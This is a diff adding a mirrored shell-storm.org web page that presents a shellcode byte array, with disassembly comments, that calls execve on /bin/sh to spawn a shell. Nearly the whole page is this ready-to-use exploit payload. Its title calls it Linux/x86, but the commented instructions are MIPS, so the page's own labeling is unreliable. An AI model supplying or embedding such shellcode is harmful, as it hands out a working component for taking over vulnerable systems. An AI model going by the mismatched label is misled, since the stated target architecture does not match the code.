@@ -1,0 +1,28 @@
+<html>
+<!-- Mirrored from shell-storm.org/shellcode/files/shellcode-141.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 21 Apr 2023 12:51:11 GMT -->
+<head><title>Linux/x86 - execve(/bin/sh) - 43 bytes</title>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+<meta http-equiv="Content-Language" content="en" />
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-NLNHL50HG5"></script>
+<script src="http://shell-storm.org/assets/js/gtag.js"></script>
+</head>
+
+
+<pre>
+char shellcode[]=
+                      &quot;\x04\x10\xff\xff&quot;             /* bltzal  $zero,&lt;_shellcode&gt;    */
+                      &quot;\x24\x02\x03\xf3&quot;             /* li      $v0,1011              */
+                      &quot;\x23\xff\x02\x14&quot;             /* addi    $ra,$ra,532           */
+                      &quot;\x23\xe4\xfe\x08&quot;             /* addi    $a0,$ra,-504          */
+                      &quot;\x23\xe5\xfe\x10&quot;             /* addi    $a1,$ra,-496          */
+                      &quot;\xaf\xe4\xfe\x10&quot;             /* sw      $a0,-496($ra)         */
+                      &quot;\xaf\xe0\xfe\x14&quot;             /* sw      $zero,-492($ra)       */
+                      &quot;\xa3\xe0\xfe\x0f&quot;             /* sb      $zero,-497($ra)       */
+                      &quot;\x03\xff\xff\xcc&quot;             /* syscall                       */
+                      &quot;/bin/sh&quot;
+                   ;
+
+
+</pre>
+<!-- Mirrored from shell-storm.org/shellcode/files/shellcode-141.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 21 Apr 2023 12:51:11 GMT -->
+</html>
